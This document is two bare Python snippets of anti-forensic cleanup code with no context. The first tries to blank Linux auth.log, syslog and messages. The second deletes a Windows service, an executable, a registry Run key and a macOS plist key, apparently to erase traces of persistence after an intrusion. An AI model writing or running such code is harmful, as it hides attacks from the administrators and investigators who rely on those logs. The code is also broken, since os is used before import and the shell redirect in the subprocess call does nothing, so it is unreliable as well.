import subprocess

def clear_system_logs():
    logs_directory = '/var/log/'
    subfolders = ['auth.log', 'syslog', 'messages']
    
    for subfolder in subfolders:
        log_path = os.path.join(logs_directory, subfolder)
        subprocess.run(['echo', '', '>', log_path])

clear_system_logs()
```

import os

def clear_persistence_artifacts():
    os.system('sc delete ServiceName')
    os.system('del /F /Q C:\\path\\to\\executable.exe')
    os.system('reg delete HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v ProgramName')
    os.system('plutil -remove PlistKey /path/to/plist')

clear_persistence_artifacts()
```
